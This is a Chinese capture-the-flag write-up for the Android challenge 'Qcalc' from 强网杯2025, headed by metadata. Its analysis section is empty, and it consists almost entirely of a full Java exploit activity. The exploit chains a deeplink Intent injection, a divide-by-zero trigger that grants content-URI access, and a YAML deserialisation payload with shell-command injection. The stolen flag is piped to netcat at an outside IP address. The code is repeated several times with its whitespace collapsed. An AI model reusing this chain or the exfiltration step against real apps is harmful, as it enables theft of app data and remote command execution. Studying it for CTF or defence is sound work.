---
title: 强网杯2025 Qcalc 解析 - Android Content URI授权+历史.yml反序列化
contest: 强网杯2025
year: 2025
difficulty: hard
vuln_type: web_unknown
tags:
- Android
- ExploitActivity
- deeplink
- qiangcalc://
- content://
- history.yml
- ContentResolver
- openOutputStream
- YAML反序列化
- divide-by-zero异常
- bridge_token
- fallback Intent
- Uri.encode
- FLAG_ACTIVITY_CLEAR_TOP
- Arahat0
attack_chain: 构造deeplink qiangcalc://calculate?expression=Intent.toUri(带bridge_token) → 启动ExploitActivity存fallback → 延时1800ms触发1/0 divide-by-zero → 受害端进入BridgeActivity,授予content://.../history.yml读写并回调ExploitActivity → ExploitActivity写恶意YAML(覆盖包名+ExploitActivity) → 触发2+2让受害端loadHistory()->PingUtil读flag → 550ms后回调读grantedUri获取flag → nc外传
key_payload: content://history.yml ContentResolver授权 + YAML反序列化 + 1800ms divide-by-zero异常触发
one_liner: 强网杯2025 Qcalc:Android Content URI授权链(YAML history.yml)绕过读flag,核心在1800ms divide-by-zero触发BridgeActivity+550ms读grantedUri。
lesson: Android Content URI授权漏洞利用链:deeplink触发+fallback Intent存储+divide-by-zero异常进入BridgeActivity+ContentResolver.openOutputStream写恶意YAML+回调读grantedUri;关键时序1800ms触发+550ms读取窗口;YAML反序列化通过改包名+ExploitActivity实现;flag外传用nc 111.229.198.6 6666。
quality: high
full_path: 强网杯2025_Qcalc_解析.full.md
meta_path: 强网杯2025_Qcalc_解析.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 强网杯2025 Qcalc 解析 - Android Content URI授权+历史.yml反序列化。强网杯2025 Qcalc:Android Content URI授权链(YAML history.yml)绕过读flag,核心在1800ms divide-by-zero触发BridgeActivity+550ms读grantedUri。。经验：Android Content URI授权...
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/287018.html
reasoning_chain:
- 题目是 Android Qcalc 计算器 → 触发点：AndroidManifest 里 ExploitActivity 暴露 deep link qiangcalc://calculate
- 假设：deeplink 启动能注入 Intent → 动作：构造 qiangcalc://calculate?expression=Intent.toUri(带 bridge_token)
- 动作：把 fallback Intent 通过 putExtra 存储到受害端 → 观察：首次启动成功植入 fallback
- 触发点：1/0 divide-by-zero 让计算器抛异常 → 假设：异常路径进入 BridgeActivity 授权 content URI
- 动作：延时 1800ms postDelayed 触发 qiangcalc://calculate?expression=1%2F0 → 观察：受害端进入 BridgeActivity，授权 content://.../history.yml 读写
- 假设：回调 ExploitActivity 时 getIntent().getData() 会带 grantedUri → 动作：写恶意 YAML（包名 com.attacker + ExploitActivity）→ 观察：写成功
- 动作：触发 2+2 让受害端 loadHistory()->PingUtil → 假设：恶意 YAML 解析覆盖包名让受害端读 flag 写入 history.yml
- 假设：grantedUri 在 550ms 内可读 → 动作：550ms 延迟 postDelayed 读 grantedUri → nc 外传 111.229.198.6:6666 → 完成
failed_attempts:
- 试图不延时直接触发 divide-by-zero → 失败：fallback 没植入时序窗口太短
- 试图直接读取 history.yml → 失败：没 URI 授权拿不到数据流
- 试图在 callback 同步读 grantedUri → 失败：写入未完成，必须等 550ms 时序窗口
key_observations:
- Android Content URI 授权 + YAML 反序列化是新型 deep link 攻击面
- divide-by-zero + FLAG_ACTIVITY_CLEAR_TOP 是触发异常 Activity 回调链的开关
- 1800ms 触发 + 550ms 读取是 1-2 个时序窗口，必须实测调整
- fallback Intent 持久化是 deep link 攻击的中间状态载体
- 恶意 YAML 改包名 + ExploitActivity 让受害端在 loadHistory 阶段跑攻击者代码
prerequisites:
- Android Activity 生命周期与 Intent flag（CLEAR_TOP / SINGLE_TOP）
- ContentResolver + openOutputStream/openInputStream 授权 URI 用法
- YAML 反序列化在 Android 解析器的危险方法触发
- Android deep link (qiangcalc://) 协议解析
---
# 强网杯2025 Qcalc 解析

> 原文: https://www.ctfiot.com/287018.html
> ID: 287018

一、分析漏洞

二、利用过程

// 首次由用户启动：自动驱动全链路（存fallback -> 触发BridgeActivity）Stringtoken=computeBridgeToken(VICTIM_PKG);// 1) 存储回退 Intent（指向本 Activity，并携带 bridge_token）Intentfallback=newIntent(Intent.ACTION_VIEW);fallback.setClassName(getPackageName(), ExploitActivity.class.getName());fallback.putExtra("bridge_token", token);StringintentUri=fallback.toUri(Intent.URI_INTENT_SCHEME);Stringexpr=Uri.encode(intentUri);Log.i(TAG,"STEP1 store fallback, intentUriLen="+ intentUri.length());Intentdeeplink=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression="+ expr)); deeplink.setPackage(VICTIM_PKG);Log.i(TAG,"STEP1 start deeplink to victim (store fallback) -> "+ deeplink);startActivity(deeplink);

// 2) 稍作延迟后触发异常路径进入 BridgeActivity（授予 content://.../history.yml 读写并回调本 Activity）finalIntenttrigger=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression=1%2F0"));trigger.setPackage(VICTIM_PKG);// 把 fallback 直接随触发 Intent 一起带上，避免因时序/实例导致 getIntent() 里没有该 extratrigger.putExtra("fallback", fallback);trigger.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);trigger.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);finallongdelayMs=1800L;Log.i(TAG,"STEP2 schedule divide-by-zero trigger after "+ delayMs +"ms -> "+ trigger);newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(newRunnable() {@Overridepublicvoidrun(){ startActivity(trigger); }}, delayMs);

if(uriStr.endsWith("/history.yml")) {// 写入恶意 YAMLStringyaml=buildEvilYaml("com.attacker","com.attacker.ExploitActivity"); Log.i(TAG,"STEP4 write YAML begin: n"+ yaml);try(OutputStreamos=getContentResolver().openOutputStream(dataUri,"w")) {if(os ==null)thrownewIllegalStateException("openOutputStream returned null");byte[] bytes = yaml.getBytes(StandardCharsets.UTF_8); os.write(bytes); Log.i(TAG,"STEP4 write YAML done, bytes="+ bytes.length); }

// 快速触发 2+2 让受害端执行 loadHistory()->PingUtilfinalIntentrun=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression=2%2B2"));run.setPackage(VICTIM_PKG);newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> startActivity(run),100);// 抢时间窗读取同一 grantedUri（本次回调自带授权）finalUrigrantedUri=dataUri;newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {newThread(() -> {try{StringBuildersb=newStringBuilder();try(InputStreamis=getContentResolver().openInputStream(grantedUri);InputStreamReaderir=newInputStreamReader(is, StandardCharsets.UTF_8);BufferedReaderbr=newBufferedReader(ir)) { String line;while((line = br.readLine()) !=null) sb.append(line); }StringflagText=sb.toString(); Log.i(TAG,"STEP5 read history.yml:n"+ flagText);Stringsafe=flagText.replace("'","'\''");Stringcmd="printf '%s' '"+ safe +"' | nc 111.229.198.6 6666"; execShellCommand(cmd,"nc"); }catch(Exception e) { Log.e(TAG,"readInline error: "+ e); }}).start();},550);// 就是这个得慢慢测！！！

三、EXP

packagecom.attacker;importandroid.app.Activity;importandroid.content.ContentResolver;importandroid.content.Intent;importandroid.net.Uri;importandroid.os.Bundle;importandroid.util.Log;importjava.io.InputStream;importjava.io.InputStreamReader;importjava.io.BufferedReader;importjava.io.OutputStream;importjava.io.File;importjava.io.FileOutputStream;importjava.nio.charset.StandardCharsets;publicclassExploitActivityextendsActivity{privatestaticfinalStringTAG="Exploit";privatestaticfinalStringVICTIM_PKG="com.qinquang.calc";@OverrideprotectedvoidonCreate(Bundle savedInstanceState){super.onCreate(savedInstanceState);Intentin=getIntent(); Log.i(TAG,"LAUNCH in="+ in);UridataUri=in !=null? in.getData() :
null;if(dataUri ==null) {// 首次由用户启动：自动驱动全链路（存fallback -> 触发BridgeActivity）try{Stringtoken=computeBridgeToken(VICTIM_PKG);// 1) 存储回退 Intent（指向本 Activity，并携带 bridge_token）Intentfallback=newIntent(Intent.ACTION_VIEW); fallback.setClassName(getPackageName(), ExploitActivity.class.getName()); fallback.putExtra("bridge_token", token);StringintentUri=fallback.toUri(Intent.URI_INTENT_SCHEME);Stringexpr=Uri.encode(intentUri); Log.i(TAG,"STEP1 store fallback, intentUriLen="+ intentUri.length());Intentdeeplink=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression="+ expr)); deeplink.setPackage(VICTIM_PKG); Log.i(TAG,"STEP1 start deeplink to victim (store fallback) -> "+ deeplink); startActivity(deeplink);// 2) 稍作延迟后触发异常路径进入 BridgeActivity（授予 content://.../history.yml 读写并回调本 Activity）finalIntenttrigger=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression=1%2F0")); trigger.setPackage(VICTIM_PKG);// 把 fallback 直接随触发 Intent 一起带上，避免因时序/实例导致 getIntent() 里没有该 extra trigger.putExtra("fallback", fallback); trigger.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); trigger.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);finallongdelayMs=1800L; Log.i(TAG,"STEP2 schedule divide-by-zero trigger after "+ delayMs +"ms -> "+ trigger);newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(newRunnable() {@Overridepublicvoidrun(){ startActivity(trigger); } }, delayMs); }catch(Exception e) { Log.e(TAG,"Bootstrap error: "+ e); }finally{// 等待 BridgeActivity 回调本 Activity（第二次启动） finish(); }return; }// 第二次由受害端回调try{ Log.i(TAG,"STEP3 callback with dataUri="+ dataUri);StringuriStr=String.valueOf(dataUri); Log.i(TAG,"uriStr="+ uriStr);if(uriStr.endsWith("/history.yml")) {// 写入恶意 YAML（受害端解析后将 flag 覆盖写入 history.yml）Stringyaml=buildEvilYaml("com.attacker","com.attacker.ExploitActivity"); Log.i(TAG,"STEP4 write YAML begin: n"+ yaml);try(OutputStreamos=getContentResolver().openOutputStream(dataUri,"w")) {if(os ==null)thrownewIllegalStateException("openOutputStream returned null");byte[] bytes = yaml.getBytes(StandardCharsets.UTF_8); os.write(bytes); Log.i(TAG,"STEP4 write YAML done, bytes="+ bytes.length); }// 快速触发 2+2 让受害端执行 loadHistory()->PingUtilfinalIntentrun=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression=2%2B2")); run.setPackage(VICTIM_PKG);newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> startActivity(run),100);// 抢时间窗读取同一 grantedUri（本次回调自带授权）finalUrigrantedUri=dataUri;newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {newThread(() -> {try{StringBuildersb=newStringBuilder();try(InputStreamis=getContentResolver().openInputStream(grantedUri);InputStreamReaderir=newInputStreamReader(is, StandardCharsets.UTF_8);BufferedReaderbr=newBufferedReader(ir)) { String line;while((line = br.readLine()) !=null) sb.append(line); }StringflagText=sb.toString(); Log.i(TAG,"STEP5 read history.yml:n"+ flagText);Stringsafe=flagText.replace("'","'\''");Stringcmd="printf '%s' '"+ safe +"' | nc 111.229.198.6 6666"; execShellCommand(cmd,"nc"); }catch(Exception e) { Log.e(TAG,"readInline error: "+ e); } }).start(); },550); } }catch(Exception e) { Log.e(TAG,"Exploit error: "+ e); }finally{// 等待延时任务完成读取后由系统回收 } }privatestaticStringbuildEvilYaml(String pkg, String cls){Stringsrc="/data/data/com.qinquang.calc/flag*";// 覆盖写入两处：files/history.yml 与 files/flag.txt，然后内部启动 HistoryActivity 触发 loadStringyaml="- !!com.qinquang.calc.PingUtil |n"+" 127.0.0.1; /system/bin/cat "+ src +" > /data/data/com.qinquang.calc/files/history.yml; /system/bin/cat "+ src +" > /data/data/com.qinquang.calc/files/flag.txtn";returnyaml;}privatevoidexecShellCommand(String cmd, String prefix){Processproc=null;BufferedReaderreader=null;try{ Log.i(TAG, prefix +" start: "+ cmd); proc =newProcessBuilder("/system/bin/sh","-c", cmd) .redirectErrorStream(true) .start(); reader =newBufferedReader(newInputStreamReader(proc.getInputStream())); String line;while((line = reader.readLine()) !=null) { Log.i(TAG, prefix +" | "+ line); }intcode=proc.waitFor(); Log.i(TAG, prefix +" exit="+ code); }catch(Exception e) { Log.e(TAG, prefix +" error: "+ e); }finally{try{if(reader !=null) reader.close(); }catch(Exception ignore) {}if(proc !=null) proc.destroy(); }}privatestaticStringcomputeBridgeToken(String packageName)throwsException { java.security.MessageDigestmd=java.security.MessageDigest.getInstance("SHA-256");byte[] hash = md.digest(packageName.getBytes(StandardCharsets.UTF_8));StringBuildersb=newStringBuilder();for(inti=0; i <8; i++) { sb.append(String.format("%02x", hash[i])); }returnsb.toString();}}

看雪ID：Arahat0

https://bbs.kanxue.com/user-home-964693.htm

*本文为看雪论坛优秀文章，由 Arahat0原创，转载请注明来自看雪社区

# 往期推荐

V8 Bytecode反汇编/反编译不完全指南

静态程序分析之数据流分析(Foundations + LiveVar Analysis Code)续

tt x-gorgon分析

基于Minifilter实现目录保护软件，自定义保护目录，用户可选择是否允许文件行为

一道简单的RE迷宫题

球分享

球点赞

球在看

点击阅读原文查看更多


```
// 首次由用户启动：自动驱动全链路（存fallback -> 触发BridgeActivity）Stringtoken=computeBridgeToken(VICTIM_PKG);// 1) 存储回退 Intent（指向本 Activity，并携带 bridge_token）Intentfallback=newIntent(Intent.ACTION_VIEW);fallback.setClassName(getPackageName(), ExploitActivity.class.getName());fallback.putExtra("bridge_token", token);StringintentUri=fallback.toUri(Intent.URI_INTENT_SCHEME);Stringexpr=Uri.encode(intentUri);Log.i(TAG,"STEP1 store fallback, intentUriLen="+ intentUri.length());Intentdeeplink=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression="+ expr)); deeplink.setPackage(VICTIM_PKG);Log.i(TAG,"STEP1 start deeplink to victim (store fallback) -> "+ deeplink);startActivity(deeplink);
// 2) 稍作延迟后触发异常路径进入 BridgeActivity（授予 content://.../history.yml 读写并回调本 Activity）finalIntenttrigger=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression=1%2F0"));trigger.setPackage(VICTIM_PKG);// 把 fallback 直接随触发 Intent 一起带上，避免因时序/实例导致 getIntent() 里没有该 extratrigger.putExtra("fallback", fallback);trigger.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);trigger.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);finallongdelayMs=1800L;Log.i(TAG,"STEP2 schedule divide-by-zero trigger after "+ delayMs +"ms -> "+ trigger);newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(newRunnable() {@Overridepublicvoidrun(){ startActivity(trigger); }}, delayMs);
if(uriStr.endsWith("/history.yml")) {// 写入恶意 YAMLStringyaml=buildEvilYaml("com.attacker","com.attacker.ExploitActivity"); Log.i(TAG,"STEP4 write YAML begin: n"+ yaml);try(OutputStreamos=getContentResolver().openOutputStream(dataUri,"w")) {if(os ==null)thrownewIllegalStateException("openOutputStream returned null");byte[] bytes = yaml.getBytes(StandardCharsets.UTF_8); os.write(bytes); Log.i(TAG,"STEP4 write YAML done, bytes="+ bytes.length); }
// 快速触发 2+2 让受害端执行 loadHistory()->PingUtilfinalIntentrun=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression=2%2B2"));run.setPackage(VICTIM_PKG);newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> startActivity(run),100);// 抢时间窗读取同一 grantedUri（本次回调自带授权）finalUrigrantedUri=dataUri;newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {newThread(() -> {try{StringBuildersb=newStringBuilder();try(InputStreamis=getContentResolver().openInputStream(grantedUri);InputStreamReaderir=newInputStreamReader(is, StandardCharsets.UTF_8);BufferedReaderbr=newBufferedReader(ir)) { String line;while((line = br.readLine()) !=null) sb.append(line); }StringflagText=sb.toString(); Log.i(TAG,"STEP5 read history.yml:n"+ flagText);Stringsafe=flagText.replace("'","'\''");Stringcmd="printf '%s' '"+ safe +"' | nc 111.229.198.6 6666"; execShellCommand(cmd,"nc"); }catch(Exception e) { Log.e(TAG,"readInline error: "+ e); }}).start();},550);// 就是这个得慢慢测！！！
packagecom.attacker;importandroid.app.Activity;importandroid.content.ContentResolver;importandroid.content.Intent;importandroid.net.Uri;importandroid.os.Bundle;importandroid.util.Log;importjava.io.InputStream;importjava.io.InputStreamReader;importjava.io.BufferedReader;importjava.io.OutputStream;importjava.io.File;importjava.io.FileOutputStream;importjava.nio.charset.StandardCharsets;publicclassExploitActivityextendsActivity{privatestaticfinalStringTAG="Exploit";privatestaticfinalStringVICTIM_PKG="com.qinquang.calc";@OverrideprotectedvoidonCreate(Bundle savedInstanceState){super.onCreate(savedInstanceState);Intentin=getIntent(); Log.i(TAG,"LAUNCH in="+ in);UridataUri=in !=null? in.getData() :
null;if(dataUri ==null) {// 首次由用户启动：自动驱动全链路（存fallback -> 触发BridgeActivity）try{Stringtoken=computeBridgeToken(VICTIM_PKG);// 1) 存储回退 Intent（指向本 Activity，并携带 bridge_token）Intentfallback=newIntent(Intent.ACTION_VIEW); fallback.setClassName(getPackageName(), ExploitActivity.class.getName()); fallback.putExtra("bridge_token", token);StringintentUri=fallback.toUri(Intent.URI_INTENT_SCHEME);Stringexpr=Uri.encode(intentUri); Log.i(TAG,"STEP1 store fallback, intentUriLen="+ intentUri.length());Intentdeeplink=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression="+ expr)); deeplink.setPackage(VICTIM_PKG); Log.i(TAG,"STEP1 start deeplink to victim (store fallback) -> "+ deeplink); startActivity(deeplink);// 2) 稍作延迟后触发异常路径进入 BridgeActivity（授予 content://.../history.yml 读写并回调本 Activity）finalIntenttrigger=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression=1%2F0")); trigger.setPackage(VICTIM_PKG);// 把 fallback 直接随触发 Intent 一起带上，避免因时序/实例导致 getIntent() 里没有该 extra trigger.putExtra("fallback", fallback); trigger.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); trigger.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);finallongdelayMs=1800L; Log.i(TAG,"STEP2 schedule divide-by-zero trigger after "+ delayMs +"ms -> "+ trigger);newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(newRunnable() {@Overridepublicvoidrun(){ startActivity(trigger); } }, delayMs); }catch(Exception e) { Log.e(TAG,"Bootstrap error: "+ e); }finally{// 等待 BridgeActivity 回调本 Activity（第二次启动） finish(); }return; }// 第二次由受害端回调try{ Log.i(TAG,"STEP3 callback with dataUri="+ dataUri);StringuriStr=String.valueOf(dataUri); Log.i(TAG,"uriStr="+ uriStr);if(uriStr.endsWith("/history.yml")) {// 写入恶意 YAML（受害端解析后将 flag 覆盖写入 history.yml）Stringyaml=buildEvilYaml("com.attacker","com.attacker.ExploitActivity"); Log.i(TAG,"STEP4 write YAML begin: n"+ yaml);try(OutputStreamos=getContentResolver().openOutputStream(dataUri,"w")) {if(os ==null)thrownewIllegalStateException("openOutputStream returned null");byte[] bytes = yaml.getBytes(StandardCharsets.UTF_8); os.write(bytes); Log.i(TAG,"STEP4 write YAML done, bytes="+ bytes.length); }// 快速触发 2+2 让受害端执行 loadHistory()->PingUtilfinalIntentrun=newIntent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression=2%2B2")); run.setPackage(VICTIM_PKG);newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> startActivity(run),100);// 抢时间窗读取同一 grantedUri（本次回调自带授权）finalUrigrantedUri=dataUri;newandroid.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {newThread(() -> {try{StringBuildersb=newStringBuilder();try(InputStreamis=getContentResolver().openInputStream(grantedUri);InputStreamReaderir=newInputStreamReader(is, StandardCharsets.UTF_8);BufferedReaderbr=newBufferedReader(ir)) { String line;while((line = br.readLine()) !=null) sb.append(line); }StringflagText=sb.toString(); Log.i(TAG,"STEP5 read history.yml:n"+ flagText);Stringsafe=flagText.replace("'","'\''");Stringcmd="printf '%s' '"+ safe +"' | nc 111.229.198.6 6666"; execShellCommand(cmd,"nc"); }catch(Exception e) { Log.e(TAG,"readInline error: "+ e); } }).start(); },550); } }catch(Exception e) { Log.e(TAG,"Exploit error: "+ e); }finally{// 等待延时任务完成读取后由系统回收 } }privatestaticStringbuildEvilYaml(String pkg, String cls){Stringsrc="/data/data/com.qinquang.calc/flag*";// 覆盖写入两处：files/history.yml 与 files/flag.txt，然后内部启动 HistoryActivity 触发 loadStringyaml="- !!com.qinquang.calc.PingUtil |n"+" 127.0.0.1; /system/bin/cat "+ src +" > /data/data/com.qinquang.calc/files/history.yml; /system/bin/cat "+ src +" > /data/data/com.qinquang.calc/files/flag.txtn";returnyaml;}privatevoidexecShellCommand(String cmd, String prefix){Processproc=null;BufferedReaderreader=null;try{ Log.i(TAG, prefix +" start: "+ cmd); proc =newProcessBuilder("/system/bin/sh","-c", cmd) .redirectErrorStream(true) .start(); reader =newBufferedReader(newInputStreamReader(proc.getInputStream())); String line;while((line = reader.readLine()) !=null) { Log.i(TAG, prefix +" | "+ line); }intcode=proc.waitFor(); Log.i(TAG, prefix +" exit="+ code); }catch(Exception e) { Log.e(TAG, prefix +" error: "+ e); }finally{try{if(reader !=null) reader.close(); }catch(Exception ignore) {}if(proc !=null) proc.destroy(); }}privatestaticStringcomputeBridgeToken(String packageName)throwsException { java.security.MessageDigestmd=java.security.MessageDigest.getInstance("SHA-256");byte[] hash = md.digest(packageName.getBytes(StandardCharsets.UTF_8));StringBuildersb=newStringBuilder();for(inti=0; i <8; i++) { sb.append(String.format("%02x", hash[i])); }returnsb.toString();}}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]